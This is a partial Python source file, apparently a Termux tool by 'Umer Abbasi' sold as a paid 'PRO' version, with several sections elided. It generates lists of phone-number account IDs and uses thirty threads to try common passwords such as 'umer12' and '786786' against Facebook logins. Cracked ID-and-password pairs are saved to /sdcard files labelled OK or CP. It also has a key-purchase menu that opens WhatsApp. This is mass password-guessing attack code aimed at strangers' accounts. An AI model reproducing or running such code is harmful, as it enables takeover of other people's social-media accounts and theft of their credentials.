...
try:
        ...
        os.system('python Umerabbasi7576.py')
except:pass
...
----------------------------------------------
 Author    : Umer Abbasi
 Github    : Umerabbasi7576
 Facebook  : Umer Abbasi
 Tool Name : Umer Abbasi-Tool
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 UMER ABBASI Pro version 1.9.8
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi Umer Abbasi Sir, I Need To Buy Your Paid Umer Abbasi PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Umerabbasi7576.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Umer Abbasi:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'umerbhai','umer1122','abbasi12345','78601234','umer12','bhai786','bhailog','jan23456','tomerahy123','786786']
...
def bd():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Umerabbasi:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: umer , abbasi, sajjad, dilshad\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [UMER-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [UMER-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Umer Abbasi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/UMER-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [UMER-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/UMER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [UMER-OK] '+uid+' | '+pas+'\033[1;97m')
